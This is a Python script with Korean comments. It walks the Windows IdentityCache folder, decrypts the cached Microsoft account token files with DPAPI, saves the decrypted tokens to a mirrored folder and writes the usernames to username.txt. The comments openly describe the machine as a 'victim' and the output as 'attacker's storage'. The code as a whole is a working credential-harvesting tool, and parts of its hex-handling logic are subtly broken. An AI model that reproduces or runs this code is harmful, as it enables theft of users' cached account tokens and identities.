import os
from win32crypt import CryptUnprotectData
import json

def dpapi_decrypt(encrypted_data):
    # 00을 제거하고 공백으로 나누어 리스트를 생성
    hex_string = ' '.join([format(byte, '02x') for byte in encrypted_data])
    hex_list = hex_string.split('00')
    # 빈 문자열 및 ' ' 문자열 제거
    hex_list = [x for x in hex_string if x and x != ' ']
    # 16진수 문자열을 바이트로 변환
    byte_string = bytes.fromhex(''.join(hex_list))
    try:       #DPAPI 복호화
        decrypted_data = CryptUnprotectData(byte_string, None, None, None, 0)[1]
        decrypted_text = decrypted_data.decode('utf-8', errors='ignore')
        return decrypted_text
    except Exception as e:      #DPAPI 복호화 실패
        print(f"복호화 실패: {str(e)}")


def decrypt_and_save(encrypted_file_path):
    home = os.path.expanduser('~')
    prefix_to_remove = os.path.join(home, 'AppData', 'Local', 'Microsoft')
    result_path = encrypted_file_path[len(prefix_to_remove)+1:] #복호화된 파일 저장할 path 설정
    try:
        with open(encrypted_file_path, 'rb') as f:  #victim 기기에서 DPAPI 암호화된 token file open
            encrypted_data = f.read()
    except Exception as e:
        print(f"open_input_file failed: {e}")

    decrypted_text = dpapi_decrypt(encrypted_data)  #token file decrypt
    decrypted_text_json = json.loads(decrypted_text) #복호화된 데이터에서 username 찾아서 .txt파일로 저장

    if 'username' in decrypted_text_json:
        with open('username.txt', 'a') as file:
            file.writelines(decrypted_text_json['username'])
            file.write('\n')

    try:     #save file in attacker's storage
        with open(result_path, 'w') as f:
            f.write(decrypted_text)
    except Exception as e:
        print(f"open_output_file failed: {e}")


def dfs_folder_structure(folder_path):
    home = os.path.expanduser('~')
    prefix_to_remove = os.path.join(home, 'AppData', 'Local', 'Microsoft')
    result_path = folder_path[len(prefix_to_remove)+1:]
    if not os.path.exists(result_path): #재귀 돌면서 directory 복사하기
        os.makedirs(result_path)

    try:
        # 현재 폴더 내의 모든 파일과 하위 폴더에 대해 반복
        for entry in os.listdir(folder_path):
            entry_path = os.path.join(folder_path, entry)
            # 하위 폴더인 경우 재귀적으로 탐색
            if os.path.isdir(entry_path):
                dfs_folder_structure(entry_path)
            else:
                # 파일인 경우 파일 경로 출력
                decrypt_and_save(entry_path)
    except Exception as e:
        print(f"Error: {e}")

# 시작 경로
user_home = os.path.expanduser('~')
start_path = os.path.join(user_home, 'AppData', 'Local', 'Microsoft', 'IdentityCache', '1', 'UD') #Microsoft 폴더 내 IdentityCache\1\UD 폴더를 찾아서 시작. 해당 폴더가 없으면 캐싱된 계정이 없는 것
if os.path.exists(start_path): #start path가 존재할 경우 (IdentityCache가 존재할 경우)
    dfs_folder_structure(start_path) # DFS로 폴더 구조 탐색
else:   #victim 기기 내에 캐싱된 계정이 없는 경우
    print("Cached accounts doesn't exist")